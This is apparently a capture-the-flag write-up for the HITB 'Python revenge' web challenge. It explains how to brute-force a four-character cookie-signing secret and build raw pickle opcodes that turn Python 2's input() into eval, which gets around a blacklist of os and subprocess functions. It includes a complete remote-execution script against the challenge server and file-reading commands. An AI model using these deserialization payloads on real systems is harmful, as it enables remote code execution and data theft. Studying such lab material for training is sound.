# Python revenge (Web)

In the task we get access to a webpage which stores some data we input in a form.
We also get [source code](revenge.py) of the page.
It's using Flask and Python.

The important part is the way the page stores our input:

```python
location = b64e(pickle.dumps(location))
cookie = make_cookie(location, cookie_secret)
```

So the data are stored in a cookie using pickle, and as it seems they are loaded the same way:

```python
def loads(strs):
    reload(pickle)
    files = StringIO(strs)
    unpkler = pickle.Unpickler(files)
    unpkler.dispatch[pickle.REDUCE] = _hook_call(
        unpkler.dispatch[pickle.REDUCE])
    return unpkler.load()
```

We've written already quite a few writeups on exploiting pickle.
In short pickle deserialization can call functions.
We only need to have a callable and tuple of arguments and we can call this.
The simplest trick would be to make a pickle like:

```
cos
system
(S'ls -la'
tR.
```

Where `c` means that rests of the line is module name and next line is symbol name to import, `S'some string'` places a string on the stack, `t` means pop elements from the stack up until `(` and then place a tuple of all those arguments on the stack, and `R` means pop 2 elements from the stack, and try to call the first one with second one as argument. 
Dot is just end of pickle.

So this translates to: `os.system('ls -la')`

In our task we've got two issues to overcome. First there is a signature for the cookie content:

```python
def getlocation():
    cookie = request.cookies.get('location')
    if not cookie:
        return ''
    (digest, location) = cookie.split("!")
    if not safe_str_cmp(calc_digest(location, cookie_secret), digest):
        flash("Hey! This is not a valid cookie! Leave me alone.")
        return False
    location = loads(b64d(location))
    return location


def make_cookie(location, secret):
    return "%s!%s" % (calc_digest(location, secret), location)


def calc_digest(location, secret):
    return sha256("%s%s" % (location, secret)).hexdigest()
```

So we can't simply place any payload in the cookie, because we need to know the hash.
The secret to hash is appended at the end, so we can'y simply use hash length extension here.
However, we notice in the code:

```python
if not os.path.exists('.secret'):
    with open(".secret", "w") as f:
        secret = ''.join(random.choice(string.ascii_letters + string.digits)
                         for x in range(4))
        f.write(secret)
with open(".secret", "r") as f:
    cookie_secret = f.read().strip()
```

So the `secret` is actually only 4 bytes and only from `string.ascii_letters + string.digits` charset!
We can simply grab an some random cookie and then run:

```python
def break_cookie():
    data = 'd7e3bd07f7ae389f07abe89d199ebae1e1e67b4479a98870ee5a3c4fe0f56237!VjErMQpwMAou'
    (hash, msg) = data.split("!")
    for c in itertools.product(string.ascii_letters + string.digits, repeat=4):
        if hashlib.sha256("%s%s" % (msg, "".join(c))).hexdigest() == hash:
            print("".join(c))


break_cookie()
```

This way we recover secret `hitb`

Now we can send arbitrary payloads to the page, now we need to face the second issue:

```python
black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]
```

We can't use any of those in our pickle payload, so our example with `os.system` won't do.

It took a moment to notice one important thing about this task - it's Python 2, and on the blacklist there is no `input()` function.
There is a huge difference between Python 2 and 3 regarding this function.
In Python 3 it behaves the same as `raw_input()` from Python 2 - it simply reads input from stdin.
But in Python 2 what it does is actually `eval(raw_input())`, so by using `input()` we can do `eval()`.

The function itself we can grab from `__builtin__` module so simple:

```
c__builtin__
input
(S'> '\ntR.
```

Would invoke the function with `> ` as prompt.
Now we need to actually send some data to the function, but it reads from `stdin`.
Fortunately python allows to monkey-patch almost anything, so we can simply assign some object to `sys.stdin` and therefore substitute stdin for something else.
Of course pickle requires the functinal form of `function, args` so we actually need to do `setattr(sys, 'stdin', something_else)`
Again, we can grab `setattr` from `__builtin__`.
To get `sys` module object we need to import it.
We can't use `csys` or `isys` because both require actually importing something from this module, not module itself.
What we need is to call `__import__('sys')`, and again function `__import__` is in `__builtin__`.

So we can just do:

```
c__builtin__
setattr
(c__builtin__
__import__
(S'sys'
tR
S'stdin'
SOMETHING_ELSE
tR.
```

Which will translate to `__builtin__.setattr(__builtin__.__import__('sys'),'stdin',SOMETHING_ELSE)`

Now the last part is to change `stdin` into some string based source, for that we can just use `StringIO` class so:

```
cStringIO
StringIO
(S'command'
tR.
```

So now if we combine this we get:

```
c__builtin__
setattr
(c__builtin__
__import__
(S'sys'
tRS'stdin'
cStringIO
StringIO
(S'" + command_to_eval + "'
tRtRc__builtin__
input
(S'python> '
tR.
```

Which translates to:

```
newstdin = StringIO.StringIO(command_to_eval) # just for readability
__builtin__.setattr(__builtin__.__import__('sys'),'stdin',newstdin)
__builtin__.input('python> ')
```

And gives us power to execute python.

The final attck script is simply:

```python
def main():
    url = "http://47.75.151.118:9999"
    response = ""
    while True:
        try:
            command_to_eval = raw_input("python> ")
            payload = "c__builtin__\nsetattr\n(c__builtin__\n__import__\n(S'sys'\ntRS'stdin'\ncStringIO\nStringIO\n(S'" + command_to_eval + "'\ntRtRc__builtin__\ninput\n(S'> '\ntR."
            response = requests.get(url, cookies={"location": make_cookie(base64.b64encode(payload), 'hitb')})
            print(re.findall('<h3 class="wow fadeInLeftBig">(.*?)</h3>', response.text, re.DOTALL)[0])
        except Exception as e:
            print(response.text)


main()
```

We can execute for example `__import__("subprocess").check_output("ls")` to run `ls` command.
For some reason it was failing on some commands, so we just kept using Python API like `__import__("os").listdir("/")`
In the root there was file `flag_is_here` and by sending `open('/flag_is_here','r').read()` we get: `HITB{Py5h0n1st8eBe3tNOW}`

